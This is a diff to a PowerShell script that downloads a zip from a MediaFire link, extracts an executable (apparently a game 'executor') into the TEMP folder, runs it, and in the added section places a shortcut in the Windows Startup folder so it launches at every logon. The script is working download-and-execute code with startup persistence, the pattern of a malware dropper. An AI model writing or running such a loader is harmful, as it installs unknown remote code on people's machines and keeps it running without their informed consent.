@@ -3,13 +3,12 @@
 # ==============================
 
 $mediaFireUrl = "https://www.mediafire.com/file/f0rj0qxla4y354c/"
-#$password      = "lunaexecutor"
-$zipName       = "Real.zip"
-$exeName       = "RealExecutor.exe"
-
-$tempPath    = $env:TEMP
-$zipPath     = Join-Path $tempPath $zipName
-$extractPath = Join-Path $tempPath "RealExecutor"
+#$password = ""
+$zipName = "Real.zip"
+$exeName = "RealSetup.exe"
+$tempPath  = $env:TEMP
+$zipPath  = Join-Path $tempPath $zipName
+$extractPath = Join-Path $tempPath "Real"
 
 # ==============================
 # 2. Prepare extraction directory
@@ -156,3 +155,17 @@ Write-Host "Starting $exePath"
 Start-Process `
     -FilePath $exePath `
     -Wait
+
+# ==============================
+# 8. Ink in Start Up
+# ==============================
+
+$shortcutName = "Real.lnk"
+$startmenuPath = "$env:appdata\Microsoft\Windows\Start Menu\Programs\Startup"
+$shortcutFile = Join-Path $startmenuPath $shortcutName
+
+$WScriptShell = New-Object -ComObject WScript.Shell
+$Shortcut = $WScriptShell.CreateShortcut($shortcutFile)
+$Shortcut.TargetPath = $exePath
+$Shortcut.WorkingDirectory = Split-Path -Parent $exePath
+$Shortcut.Save()
